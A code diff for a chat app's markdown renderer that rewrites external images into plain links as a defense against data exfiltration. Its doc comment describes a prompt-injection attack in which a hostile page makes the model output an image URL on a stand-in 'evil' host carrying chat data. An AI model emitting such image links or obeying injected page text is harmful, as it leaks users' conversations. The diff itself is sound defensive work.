@@ -237,7 +237,39 @@ marked.use({
  * allowlist.
  */
 export function renderMarkdown(text: string): string {
-  return DOMPurify.sanitize(marked.parse(text) as string, { ADD_ATTR: ['target'] });
+  const html = DOMPurify.sanitize(marked.parse(text) as string, { ADD_ATTR: ['target'] });
+  return html.includes('<img') ? linkExternalImages(html) : html;
+}
+
+function isExternalImage(src: string): boolean {
+  try {
+    const url = new URL(src, window.location.href);
+    return /^https?:$/.test(url.protocol) && url.origin !== window.location.origin;
+  } catch {
+    return false;
+  }
+}
+
+/**
+ * Replace external images with links (S6). A prompt-injected page can make
+ * the model emit ![](https://evil/?d=<chat data>), and an <img> sends that
+ * request the moment the reply renders. The rewrite runs in an inert
+ * DOMParser document: an <img> created in the live page starts loading even
+ * when it is never attached.
+ */
+function linkExternalImages(html: string): string {
+  const doc = new DOMParser().parseFromString(html, 'text/html');
+  for (const img of Array.from(doc.querySelectorAll('img'))) {
+    const src = img.getAttribute('src') ?? '';
+    if (!isExternalImage(src)) continue;
+    const link = doc.createElement('a');
+    link.href = src;
+    link.target = '_blank';
+    link.rel = 'noopener noreferrer';
+    link.textContent = `🖼️ ${img.getAttribute('alt') || new URL(src).hostname}`;
+    img.replaceWith(link);
+  }
+  return doc.body.innerHTML;
 }
 
 /**
